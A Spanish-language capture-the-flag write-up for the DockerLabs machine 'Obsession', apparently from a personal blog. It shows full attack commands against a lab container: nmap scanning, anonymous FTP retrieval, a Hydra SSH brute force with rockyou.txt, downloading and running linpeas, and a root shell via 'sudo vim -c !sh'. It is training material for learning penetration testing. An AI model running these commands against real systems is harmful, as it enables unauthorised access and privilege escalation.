---
title: "Dockerlabs - Muy fácil : [Obsession]"
date: 2024-07-07 16:00:00 +0200
categories: [CTF, Writeups, Dockerlabs, Linux, Muy fácil]
tags: [CTF, Writeups, Dockerlabs, Linux, Muy fácil]
image: /img/posts/CTF/obsession/obsession.png
---


## Introducción

En esta ocasión, nos sumergimos en el desafío **"Obsession"**, un CTF diseñado para poner a prueba nuestras habilidades en un entorno Linux. Este reto, creado por **El Pingüino de Mario**, se cataloga como **muy fácil**, ideal para aquellos que están comenzando en el mundo del hacking y la seguridad informática.

🌐 [**Web oficial del CTF: DockerLabs - Obsession**](https://dockerlabs.es/#/){:target="_blank"}

Este desafío representa una excelente oportunidad para introducirse en las técnicas básicas de análisis y explotación, proporcionando una plataforma segura y controlada para aprender y practicar.


## Análisis
### Escaneo Inicial con Nmap

Antes de comenzar nuestro escaneo, vamos a detallar qué significa cada parámetro utilizado en el comando de Nmap, para entender mejor cómo funciona esta herramienta y por qué elegimos ciertas opciones:

- `-p-`: Escanea todos los puertos del 1 al 65535.
- `-sSCV`: Combina las opciones de scripts (-sC) y versión (-sV) para ejecutar scripts por defecto y detectar versiones de los servicios.
- `--min-rate 2000`: Establece la tasa mínima de paquetes enviados por segundo. Usar un valor como 2000 es un equilibrio entre velocidad y confiabilidad. Un valor muy alto, como 5000, puede causar que se pierdan respuestas de algunos servicios si la red o el host objetivo no pueden manejar tal cantidad de tráfico eficientemente, resultando en un escaneo incompleto o incorrecto.
- `-n`: Evita la resolución de DNS para acelerar el escaneo.
- `-vvv`: Incrementa el nivel de verbosidad para obtener más detalles durante el escaneo.
- `-Pn`: Omite el descubrimiento de host. Útil cuando se sabe que el host está activo y queremos acelerar el proceso.
- `-oN escaneao 172.17.0.2`: Guarda la salida del escaneo en un archivo llamado "escaneao".

Ahora que entendemos mejor cada opción, procedemos con el escaneo de la máquina objetivo:

```bash
nmap -p- -sSCV --min-rate 2000 -n -vvv -Pn -oN escaneao 172.17.0.2
```

Resultados relevantes del escaneo:
- **FTP (21/tcp)**: Servicio vsftpd 3.0.5, permite acceso anónimo.
- **SSH (22/tcp)**: OpenSSH 9.6p1.
- **HTTP (80/tcp)**: Servidor Apache httpd 2.4.58.

Dado que el servicio FTP permite acceso anónimo, este se convierte en nuestro primer punto de interés para explorar más a fondo. Este tipo de configuración puede ser una puerta de entrada importante para obtener acceso a la máquina y extraer información útil.


### Acceso FTP y Recuperación de Información

Con acceso anónimo habilitado en el servicio FTP, procedemos a conectarnos al servidor y descargar archivos que podrían contener pistas y datos sensibles. El acceso anónimo en un servicio FTP es a menudo un vector de ataque significativo porque permite a cualquier usuario acceder a archivos sin necesidad de autenticación, lo cual es una mala práctica de seguridad.

```bash
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:oscar): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55372|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18 03:20 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18 03:21 pendientes.txt
226 Directory send OK.
ftp> get chat-gonza.txt
local: chat-gonza.txt remote: chat-gonza.txt
229 Entering Extended Passive Mode (|||36664|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |*********************************************************************************************************************************************************************************************************|   667       10.25 MiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (326.00 KiB/s)
ftp> get pendientes.txt
local: pendientes.txt remote: pendientes.txt
229 Entering Extended Passive Mode (|||8350|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |*********************************************************************************************************************************************************************************************************|   315        6.00 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (20.70 KiB/s)
ftp> exit
221 Goodbye.
```

En este proceso, hemos realizado lo siguiente:

1. **Conexión al Servidor**: Usamos el comando `ftp` seguido de la dirección IP para conectarnos al servidor. Al ser solicitado por un usuario, utilizamos "anonymous", común en accesos FTP anónimos.
2. **Inicio de Sesión**: Aunque se pide una contraseña, por lo general se puede dejar en blanco o usar cualquier valor cuando el acceso es anónimo. En este caso, la conexión fue exitosa sin necesidad de una contraseña específica.
3. **Listado de Archivos**: El comando `ls` nos muestra los archivos disponibles en el servidor, lo que nos permitió identificar dos archivos de interés: `chat-gonza.txt` y `pendientes.txt`.
4. **Descarga de Archivos**: Usamos el comando `get` para descargar los archivos individualmente, lo que nos proporcionó información potencialmente sensible almacenada en el servidor.

Estos archivos ahora serán analizados para buscar información que pueda ser utilizada para profundizar en la explotación del sistema.

### Análisis de los Archivos Recuperados

Tras recuperar y examinar los archivos desde el servidor FTP, hemos obtenido dos archivos que podrían contener información valiosa:

#### Contenido de `chat-gonza.txt`:
```
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
```

#### Contenido de `pendientes.txt`:
```
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
   permisos habilitados que no son del todo seguros..
```

Después de un primer análisis, no se observa nada fuera de lo común aparte de la mención de dos usuarios: Gonza y Russoski. Estos nombres los anotamos como potenciales vectores de interés. Seguimos investigando por el puerto 80.


### Exploración de la Página Web

Al revisar la página web, notamos que el nombre **Russoski** aparece repetidas veces, lo cual es una coincidencia relevante, ya que es el mismo nombre que encontramos en las conversaciones del archivo `chat-gonza.txt`. Este detalle sugiere que Russoski podría ser un usuario administrador o de alto perfil en esta red.

#### Análisis del Código Fuente
Mientras inspeccionamos el código fuente de la página web, encontramos un comentario que puede ser crucial para nuestra investigación:

```html
<!-- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
```

Este comentario en el código fuente revela que Russoski usa el mismo nombre de usuario en todos sus servicios. Esto implica que el mismo nombre de usuario y posiblemente la misma contraseña podrían estar en uso en varios servicios como SSH, FTP, y otros sistemas internos, lo cual es una práctica de seguridad muy riesgosa.

### Implicaciones de Seguridad
El uso de la misma identificación para múltiples servicios puede simplificar significativamente el proceso de acceso no autorizado si se compromete una sola cuenta. Este hallazgo nos orienta a intentar reutilizar las credenciales obtenidas en otros servicios del sistema para ver si podemos elevar nuestros privilegios o acceder a más información sensible.

### Uso de Hydra para Acceso SSH

Dado el descubrimiento de que el usuario Russoski utiliza el mismo nombre de usuario en todos sus servicios, decidimos lanzar un ataque de fuerza bruta con Hydra para intentar obtener las credenciales de SSH. Utilizamos la conocida lista de contraseñas `rockyou.txt` para este propósito.

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 > resultado_hydra
```

#### Resultados de Hydra
Hemos obtenido el login de `russoski` , como guardamos todo, vamos a leer el fichero `resultado_hydra`

```bash
cat resultado_hydra
```

Resultados del archivo `resultado_hydra`:
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-29 21:32:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 112.00 tries/min, 112 tries in 00:01h, 14344290 to do in 2134:35h, 13 active
[22][ssh] host: 172.17.0.2   login: russoski   password: 
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-29 21:33:31
```

Con la contraseña obtenida, procedemos a acceder al sistema:

```bash
ssh russoski@172.17.0.2
```

Al ingresar la contraseña, confirmamos que estamos dentro del sistema como el usuario Russoski.

```bash
russoski@94f77d56cc59:~$ whoami
russoski
russoski@94f77d56cc59:~$ 
```

Este comando confirma que el nombre de usuario con el que estamos logueados es `russoski`, indicando que nuestro acceso al sistema ha sido exitoso y ahora tenemos control sobre la cuenta de usuario de Russoski en el servidor.

### Búsqueda de Información y Vulnerabilidades con Linpeas

Una vez dentro del sistema como usuario `russoski`, procedemos a buscar información y posibles vulnerabilidades utilizando la herramienta Linpeas. Linpeas es un script que ayuda a automatizar el proceso de enumeración durante las pruebas de penetración, facilitando la identificación de vectores de escalada de privilegios.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
chmod +x linpeas.sh 
./linpeas.sh | tee linpeas_output.txt
```

#### Hallazgos Clave de Linpeas

1. **Versión de Sudo**: Linpeas identifica la versión del comando sudo instalado en el sistema:
   - Sudo version 1.9.15p5

2. **Permiso de Ejecución sin Contraseña**: El usuario `russoski` tiene permisos configurados para ejecutar `vim` como root sin necesidad de contraseña:
   ```plaintext
   User russoski may run the following commands on 94f77d56cc59:
       (root) NOPASSWD: /usr/bin/vim
   ```

Este permiso es especialmente crítico ya que permite al usuario ejecutar comandos como root sin restricciones, lo que puede ser explotado para obtener una shell de root.

### Explotación de la Vulnerabilidad

Basándonos en la configuración encontrada, utilizamos `vim` para escalar privilegios hasta root de manera trivial. Siguiendo las instrucciones encontradas en 
🌐 [**Web oficial de HackTricks (Vulnerabilidad sudo-version)**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version/){:target="_blank"}

```bash
sudo vim -c '!sh'
```

Este comando abre `vim` y ejecuta un shell (`sh`) con privilegios de root a través de la opción `-c` que permite pasar comandos a `vim` al iniciar.

#### Confirmación de Privilegios de Root

Una vez dentro del shell de root, confirmamos nuestros privilegios:

```bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

Los comandos confirman que hemos escalado correctamente a root, mostrando el usuario `root` y su grupo correspondiente. Finalmente, exploramos el directorio root para identificar cualquier archivo sensible:

```bash
cd /root
ls
Video-Nagore-Fernandez.txt
```

Encontramos un archivo interesante llamado `Video-Nagore-Fernandez.txt`, posiblemente relacionado con la conversación en `chat-gonza.txt`.

Con estos pasos, hemos logrado escalar privilegios y obtener acceso completo al sistema, lo que nos permite explorar más a fondo cualquier información sensible o realizar acciones adicionales como parte del CTF.


## Conclusión y Consejos Finales

Hemos completado nuestro recorrido a través del desafío CTF "Obsession", comenzando con el análisis inicial hasta lograr la escalada de privilegios y el acceso total al sistema. Este proceso nos ha permitido entender y explotar múltiples aspectos de la seguridad de sistemas, desde el acceso inicial hasta la explotación de configuraciones inseguras.

### Consejo de Seguridad

Es crucial recordar que la reutilización de contraseñas y la configuración de permisos excesivos sin contraseña pueden llevar a brechas significativas de seguridad. Este desafío nos ha mostrado cómo configuraciones aparentemente inofensivas, como permitir a un usuario ejecutar una herramienta como `vim` sin contraseña, pueden ser explotadas para obtener privilegios elevados.

**Recomendación**: Siempre sigue las mejores prácticas de seguridad, como el principio de menor privilegio, y asegura que todas las cuentas tengan contraseñas únicas y seguras. Además, realiza auditorías de seguridad regularmente para identificar y mitigar configuraciones vulnerables antes de que sean explotadas.

### Despedida

Gracias por seguirme en este análisis detallado del desafío "Obsession". Espero que hayas encontrado este writeup instructivo y que te haya inspirado a profundizar más en el mundo del hacking ético y la ciberseguridad. ¡Hasta la próxima aventura en el mundo de los CTF!

---

¿Te gustó este post? No dudes en compartirlo y comentar cualquier pregunta o experiencia relacionada que desees discutir. ¡Sigue practicando y nunca dejes de aprender!
